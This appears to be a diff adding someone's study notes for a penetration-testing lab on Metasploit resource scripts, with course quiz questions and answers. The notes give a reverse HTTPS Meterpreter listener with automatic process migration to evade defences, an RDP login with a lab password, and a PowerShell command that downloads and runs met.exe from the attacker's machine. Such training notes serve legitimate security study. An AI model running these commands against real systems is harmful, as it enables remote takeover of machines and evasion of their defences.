@@ -1,0 +1,63 @@
+Questions
+
+
+nano listener.rc
+use multi/handler
+set PAYLOAD windows/meterpreter_reverse_https
+set LHOST tun0
+set LPORT 443
+
+#  we can configure the AutoRunScript option to automatically execute a module after a session was created. For this example, let's use the post/windows/manage/migrate module. This will cause the spawned Meterpreter to automatically launch a background notepad.exe process and migrate to it. Automating process migration helps to avoid situations where our payload is killed prematurely either by defensive mechanisms or the termination of the related process.
+
+set AutoRunScript post/windows/manage/migrate 
+set ExitOnSession false # ensure listener keeps accepting new connections after a sessions is created
+
+
+# -j run it as a job in the background
+# -z to stop us from automatically interacting with the session
+run -z -j
+
+# Now, let's save the script and start Metasploit by entering msfconsole with the resource script as argument for -r.
+sudo msfconsole -r listener.rc
+
+# Let's connect to the BRUTE2 machine via RDP with user justin and password SuperS3cure1337#, start PowerShell, download the malicious Windows executable met.exe that we already used in previous sections, and execute it
+
+xfreerdp /u:justin /p:SuperS3cure1337# /v:192.168.195.202
+# Open PowerShell
+PS C:\Users\justin> iwr -uri http://192.168.45.214/met.exe -Outfile met.exe 
+PS C:\Users\justin> ./met.exe
+
+# Go back to the Metasploit
+...
+[*] Spawning notepad.exe process to migrate into
+[*] Migrating into 5564
+[+] Successfully migrated into process 5564
+...
+
+# Nice! Metasploit automatically migrated to the newly spawned Notepad process.
+# Instead of creating our own resource scripts, we can also use the already provided resource scripts from Metasploit. They can be found in the scripts/resource/ directory in the Metasploit directory.
+
+# Be prompting below command it will shows that there are resource scripts provided for port scanning, brute forcing, protocol enumerations, and so on. Before we attempt to use them, we should thoroughly examine, understand, and modify them to fit our needs.
+ls -l /usr/share/metasploit-framework/scripts/resource
+
+# Some of these scripts use the global datastore of Metasploit to set options such as RHOSTS. When we use set or unset, we define options in the context of a running module. However, we can also define values for options across all modules by setting global options. These options can be set with setg and unset with unsetg.3
+
+# Resource scripts can be quite handy to automate parts of a penetration test. We can create a set of resource scripts for repetitive tasks and operations. We can prepare those scripts and then modify them for each penetration test. For example, we could prepare resource scripts for listeners, pivoting, post-exploitation, and much more. Using them on multiple penetration tests can save us a lot of time.
+
+# Lets go back to the questions 'What is the command line option of msfconsole to specify the use of a resource script?'
+-r
+
+Questions 2
+The provided resource script portscan.rc by Metasploit scans various ports in the default configuration. What is the number of the first port?
+
+HINT
+Use the command provided in Listing 94 to locate the path for the default resource scripts that MSF provides.
+By combining this path with 'portscan.rc' you can access the file, review the code, and determine the first port that was used.
+
+cp /usr/share/metasploit-framework/scripts/resource/portscan.rc .
+cat /home/Kali/Desktop/portscan.rc
+...
+<ruby>
+#set ports for Metasploit tcp-portscanner (change this for your needs):
+ports = "7,21,22,23...
+...
